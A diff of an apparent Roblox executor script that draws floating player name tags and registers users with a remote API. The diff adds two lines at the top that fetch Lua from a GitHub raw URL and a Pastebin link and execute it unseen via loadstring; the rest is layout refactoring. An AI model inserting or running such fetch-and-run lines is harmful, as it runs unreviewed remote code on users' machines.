@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ykknzo-hub/notid/refs/heads/main/notfications.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/4pBESDiH"))()
+
 local HttpService = game:GetService("HttpService")
 local plrs = game:GetService("Players")
 local tweenSvc = game:GetService("TweenService")
@@ -145,10 +148,10 @@ local customPlayers = {}
 local taggedPlrs = {}
 local registeredPlrs = {}
 
--- ===================== REQUEST =====================
+registeredPlrs[lp.UserId] = true
+
 local function request(method, url, body)
 	local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or (http and http.request)
-
 	if req then
 		local success, response = pcall(function()
 			return req({
@@ -158,11 +161,8 @@ local function request(method, url, body)
 				Body = body and HttpService:JSONEncode(body) or nil
 			})
 		end)
-		if success and response and response.Body then
-			return response.Body
-		end
+		if success and response and response.Body then return response.Body end
 	end
-
 	local success, res = pcall(function()
 		if method == "POST" then
 			return game:HttpPost(url, body and HttpService:JSONEncode(body) or "", true)
@@ -177,51 +177,37 @@ local function api(method, path, body)
 	local url = API_URL .. path .. "?secret=" .. API_SECRET
 	local res = request(method, url, body)
 	if res then
-		local ok, data = pcall(function()
-			return HttpService:JSONDecode(res)
-		end)
+		local ok, data = pcall(function() return HttpService:JSONDecode(res) end)
 		if ok then return data end
 	end
 	return nil
 end
 
 local function registerSelf()
-	api("POST", "/register", {
-		userId = lp.UserId,
-		username = lp.Name
-	})
+	api("POST", "/register", { userId = lp.UserId, username = lp.Name })
 end
 
 local function refreshActiveUsers()
 	local list = api("GET", "/active")
-	if type(list) ~= "table" then return end
-
-	local newRegistered = {}
-	for _, id in ipairs(list) do
-		newRegistered[tonumber(id)] = true
+	if type(list) == "table" then
+		for _, id in ipairs(list) do
+			registeredPlrs[tonumber(id)] = true
+		end
 	end
-	newRegistered[lp.UserId] = true
-	registeredPlrs = newRegistered
+	registeredPlrs[lp.UserId] = true
 
 	for _, plr in pairs(plrs:GetPlayers()) do
 		if registeredPlrs[plr.UserId] and not taggedPlrs[plr.UserId] then
-			if plr.Character and plr.Character:FindFirstChild("Head") then
-				task.spawn(buildTag, plr)
-			end
+			task.spawn(buildTag, plr)
 		end
 	end
 end
 
--- ===================== JSON =====================
 local function fetchJson(url, retries)
 	for i = 1, retries do
-		local success, response = pcall(function()
-			return game:HttpGet(url)
-		end)
+		local success, response = pcall(function() return game:HttpGet(url) end)
 		if success and response then
-			local ok, decoded = pcall(function()
-				return HttpService:JSONDecode(response)
-			end)
+			local ok, decoded = pcall(function() return HttpService:JSONDecode(response) end)
 			if ok then return true, decoded end
 		end
 		task.wait(1)
@@ -244,7 +230,6 @@ if ok and remoteData then
 	end
 end
 
--- ===================== UTILS =====================
 local function playTpSound()
 	local s = Instance.new("Sound")
 	s.SoundId = "rbxassetid://" .. TP_SOUND_ID
@@ -324,15 +309,13 @@ local function startTypingEffect(label, fullText)
 	end)
 end
 
--- ===================== BUILD TAG =====================
 function buildTag(plr)
 	if not registeredPlrs[plr.UserId] then return end
-	local char = plr.Character
-	if not char then return end
-	local hd = char:FindFirstChild("Head")
-	if not hd then return end
-	local hrp = char:FindFirstChild("HumanoidRootPart")
-	if not hrp then return end
+
+	local char = plr.Character or plr.CharacterAdded:Wait()
+	local hd = char:WaitForChild("Head", 10)
+	local hrp = char:WaitForChild("HumanoidRootPart", 10)
+	if not hd or not hrp then return end
 
 	taggedPlrs[plr.UserId] = true
 
@@ -350,7 +333,6 @@ function buildTag(plr)
 	local tagWidth = (customData and customData.tagWidth) or DEFAULT_TAG_WIDTH
 	local tagHeight = (customData and customData.tagHeight) or DEFAULT_TAG_HEIGHT
 	local tagOffsetY = (customData and customData.tagOffsetY) or DEFAULT_TAG_OFFSET_Y
-	local currentTagSize = UDim2.new(0, tagWidth, 0, tagHeight)
 	local currentTagOff = Vector3.new(0, tagOffsetY, 0)
 	local resolvedRankEffect = (customData and customData.rankEffect) or CONFIG.RankEffect
 
@@ -361,10 +343,12 @@ function buildTag(plr)
 
 	local finalColors = getColors()
 
+	local SHRINK_DISTANCE = 40
+
 	local bb = Instance.new("BillboardGui")
 	bb.Name = "NEMESISTag_" .. plr.UserId
 	bb.Parent = pg
-	bb.Size = currentTagSize
+	bb.Size = UDim2.new(0, tagWidth, 0, tagHeight)
 	bb.StudsOffset = currentTagOff
 	bb.AlwaysOnTop = true
 	bb.MaxDistance = math.huge
@@ -462,15 +446,10 @@ function buildTag(plr)
 		end
 	end
 
-	-- Logo
-	local IMG_W = math.floor(tagHeight * (CONFIG.LogoSizeMultiplier or 0.8))
-	local IMG_PAD = CONFIG.LogoPadding or 6
-	local TEXT_OFFSET = IMG_PAD + IMG_W + 7
-
 	local logoHolder = Instance.new("Frame")
 	logoHolder.Parent = bg
-	logoHolder.Size = UDim2.new(0, IMG_W, 0, IMG_W)
-	logoHolder.Position = UDim2.new(0, IMG_PAD, 0.5, -IMG_W/2)
+	logoHolder.Size = UDim2.new(0.22, 0, 0.8, 0)
+	logoHolder.Position = UDim2.new(0.04, 0, 0.1, 0)
 	logoHolder.BackgroundTransparency = 1
 	logoHolder.ZIndex = 4
 	logoHolder.ClipsDescendants = true
@@ -488,12 +467,11 @@ function buildTag(plr)
 	logoImg.ZIndex = 5
 	Instance.new("UICorner", logoImg).CornerRadius = UDim.new(1, 0)
 
-	-- Rank Text
 	local kzk = Instance.new("TextLabel")
 	kzk.Name = "DisplayName"
 	kzk.Parent = bg
-	kzk.Size = UDim2.new(1, -(TEXT_OFFSET + 8), 0, math.floor(tagHeight * 0.38))
-	kzk.Position = UDim2.new(0, TEXT_OFFSET, 0, math.floor(tagHeight * 0.15))
+	kzk.Size = UDim2.new(0.68, 0, 0.4, 0)
+	kzk.Position = UDim2.new(0.28, 0, 0.12, 0)
 	kzk.BackgroundTransparency = 1
 	kzk.Text = displayName
 	kzk.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -504,12 +482,11 @@ function buildTag(plr)
 	kzk.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 	kzk.ZIndex = 5
 
-	-- Username
 	local dname = Instance.new("TextLabel")
 	dname.Name = "Username"
 	dname.Parent = bg
-	dname.Size = UDim2.new(1, -(TEXT_OFFSET + 8), 0, math.floor(tagHeight * 0.26))
-	dname.Position = UDim2.new(0, TEXT_OFFSET, 0.55, 0)
+	dname.Size = UDim2.new(0.68, 0, 0.3, 0)
+	dname.Position = UDim2.new(0.28, 0, 0.55, 0)
 	dname.BackgroundTransparency = 1
 	dname.Text = "@" .. plr.Name
 	dname.TextColor3 = Color3.fromRGB(220, 220, 220)
@@ -523,8 +500,8 @@ function buildTag(plr)
 		startTypingEffect(kzk, displayName)
 	end
 
-	-- Float Animation
 	local t0 = tick()
+	local isSquare = false
 	local connection
 	connection = runSvc.Heartbeat:Connect(function()
 		if not bb or not bb.Parent then
@@ -540,15 +517,45 @@ function buildTag(plr)
 			end
 		end
 
+		local cam = workspace.CurrentCamera
+		if cam and hd then
+			local dist = (cam.CFrame.Position - hd.Position).Magnitude
+			
+			if dist >= SHRINK_DISTANCE and not isSquare then
+				isSquare = true
+				tweenSvc:Create(bb, TweenInfo.new(0.3), { Size = UDim2.new(0, tagHeight, 0, tagHeight) }):Play()
+				tweenSvc:Create(logoHolder, TweenInfo.new(0.3), { 
+					Size = UDim2.new(0.8, 0, 0.8, 0),
+					Position = UDim2.new(0.1, 0, 0.1, 0)
+				}):Play()
+				kzk.Visible = false
+				dname.Visible = false
+			elseif dist < SHRINK_DISTANCE and isSquare then
+				isSquare = false
+				tweenSvc:Create(bb, TweenInfo.new(0.3), { Size = UDim2.new(0, tagWidth, 0, tagHeight) }):Play()
+				tweenSvc:Create(logoHolder, TweenInfo.new(0.3), { 
+					Size = UDim2.new(0.22, 0, 0.8, 0),
+					Position = UDim2.new(0.04, 0, 0.1, 0)
+				}):Play()
+				kzk.Visible = true
+				dname.Visible = true
+			end
+		end
+
 		local t = tick() - t0
 		local floatY = math.sin(t * (CONFIG.FloatSpeed or 1.4)) * (CONFIG.FloatAmplitude or 0.08)
 		bb.StudsOffset = currentTagOff + Vector3.new(0, floatY, 0)
 	end)
 end
 
--- ===================== START =====================
-registerSelf()
-refreshActiveUsers()
+task.spawn(function()
+	buildTag(lp)
+end)
+
+task.spawn(function()
+	registerSelf()
+	refreshActiveUsers()
+end)
 
 task.spawn(function()
 	while true do
@@ -559,8 +566,8 @@ end)
 
 local function onCharacter(plr)
 	plr.CharacterAdded:Connect(function(char)
-		char:WaitForChild("Head", 5)
-		task.wait(0.5)
+		char:WaitForChild("Head", 10)
+		task.wait(0.2)
 		if registeredPlrs[plr.UserId] then
 			buildTag(plr)
 		end
@@ -574,7 +581,9 @@ plrs.PlayerAdded:Connect(onCharacter)
 
 plrs.PlayerRemoving:Connect(function(plr)
 	taggedPlrs[plr.UserId] = nil
-	registeredPlrs[plr.UserId] = nil
+	if plr ~= lp then
+		registeredPlrs[plr.UserId] = nil
+	end
 
 	local pg = lp:FindFirstChild("PlayerGui")
 	if pg then
@@ -582,9 +591,3 @@ plrs.PlayerRemoving:Connect(function(plr)
 		if tag then tag:Destroy() end
 	end
 end)
-
-registeredPlrs[lp.UserId] = true
-task.wait(1)
-if lp.Character then
-	buildTag(lp)
-end
